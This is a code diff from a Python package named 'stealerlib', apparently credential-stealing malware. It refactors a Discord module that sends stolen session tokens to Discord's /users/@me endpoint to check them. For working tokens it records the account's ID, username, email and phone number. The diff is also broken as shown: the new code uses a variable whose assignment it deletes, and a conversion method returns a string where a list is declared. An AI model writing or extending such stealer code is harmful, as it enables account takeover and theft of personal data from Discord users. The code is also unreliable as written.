@@ -7,22 +7,24 @@
 from stealerlib.apps.discord import *
 from stealerlib.request import HTTPHandler
 
-API = HTTPHandler(base="https://discord.com/api/v9/")
+DiscordAPI = HTTPHandler(base="https://discord.com/api/v9/")
 
 
 class DiscordTypes:
 
     @dataclass
     class Account:
-        id: str
+        valid: bool
         token: str
-        username: str
-        discriminator: str
-        email: str
-        phone: str
+        id: str=None
+        username: str=None
+        discriminator: str=None
+        email: str=None
+        phone: str=None
 
         def conv(self) -> list:
             return [
+                self.valid,
                 self.id,
                 self.token,
                 self.username,
@@ -34,39 +36,30 @@ class DiscordTypes:
     @dataclass
     class Token:
         token: str
-        valid: bool=False
-
-        def conv(self) -> list:
-            return [self.token, self.valid]
 
         def get_information(self):
-            resp = API.get(
+            resp = DiscordAPI.get(
                 endpoint="/users/@me",
                 headers={'Authorization': self.token}
             )
 
             if resp.status_code == 200:
-                self.valid = True
-                obj_r = resp.json()
-                id = obj_r['id']
-                username = obj_r['username']
-                email = obj_r['email']
-                discriminator = obj_r['discriminator']
-                phone_number = obj_r['phone']
+                new_account = DiscordTypes.Account(
+                    valid=True,
+                    token=self.token,
+                    id=obj_r['id'],
+                    username=obj_r['username'],
+                    discriminator=obj_r['discriminator'],
+                    email=obj_r['email'],
+                    phone=obj_r['phone'],
+                )
             else:
-                id = None
-                username = None
-                email = None
-                discriminator = None
-                phone_number = None
-
-            new_account = DiscordTypes.Account(
-                id=id,
-                token=self.token,
-                username=username,
-                discriminator=discriminator,
-                email=email,
-                phone=phone_number,
-            )
+                new_account = DiscordTypes.Account(
+                    valid=False,
+                    token=self.token
+                )
 
             return new_account
+
+        def conv(self) -> list:
+            return self.token
